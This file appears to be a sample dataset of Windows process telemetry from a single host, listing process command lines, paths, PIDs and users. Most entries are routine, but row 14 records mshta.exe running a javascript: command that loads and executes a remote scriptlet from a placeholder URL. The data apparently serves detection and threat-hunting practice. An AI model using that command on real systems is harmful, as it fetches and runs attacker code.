,arguments,hostname,name,path,pid,username
0,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",0004FXGWS,modulecoreservice.exe,c:\program files\common files\mcafee\modulecore,2007,mat.robinson7
1,wininit.exe,0004FXGWS,wininit.exe,C:\Windows\system32,4848,NT AUTHORITY\SYSTEM
2,"C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\ambe.alexand52\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\ambe.alexand52\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",0004FXGWS,opera_crashreporter.exe,C:\Users\ambe.alexand52\AppData\Local\Programs\Opera\56.0.3051.52,4217,ambe.alexand52
3,"""C:\Users\ambe.alexand52\AppData\Local\Programs\Python\Python37\python.exe"" ",0004FXGWS,python.exe,C:\Users\ambe.alexand52\AppData\Local\Programs\Python\Python37,5520,ambe.alexand52
4,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",0004FXGWS,MFEAvSvc.exe,C:\Program Files\McAfee\MfeAV,3614,mat.robinson7
5,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",0004FXGWS,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,4041,kyl.sanders
6,C:\Windows\System32\msdtc.exe,0004FXGWS,msdtc.exe,C:\Windows\System32,3836,NT AUTHORITY\SYSTEM
7,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",0004FXGWS,McDiReg.exe,C:\ProgramData\McAfee\Direct,3296,mat.robinson7
8,"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",0004FXGWS,tv_w32.exe,C:\Program Files (x86)\TeamViewer,3477,kyl.sanders
9,C:\Windows\system32\svchost.exe -k DcomLaunch,0004FXGWS,svchost.exe,C:\Windows\system32,4836,NT AUTHORITY\SYSTEM
10,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",0004FXGWS,McApExe.exe,C:\Program Files\Common Files\McAfee\VSCore_18_6,2477,mat.robinson7
11,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0004FXGWS,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,4569,mat.robinson7
12,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,0004FXGWS,svchost.exe,C:\Windows\System32,4064,NT AUTHORITY\SYSTEM
13,C:\Windows\System32\spoolsv.exe,0004FXGWS,spoolsv.exe,C:\Windows\System32,176,NT AUTHORITY\SYSTEM
14,C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();,0004FXGWS,mshta.exe,C:\Windows\System32\mshta.exe,1380,NT AUTHORITY\SYSTEM
15,C:\Windows\system32\svchost.exe -k netsvcs,0004FXGWS,svchost.exe,C:\Windows\system32,2312,NT AUTHORITY\SYSTEM
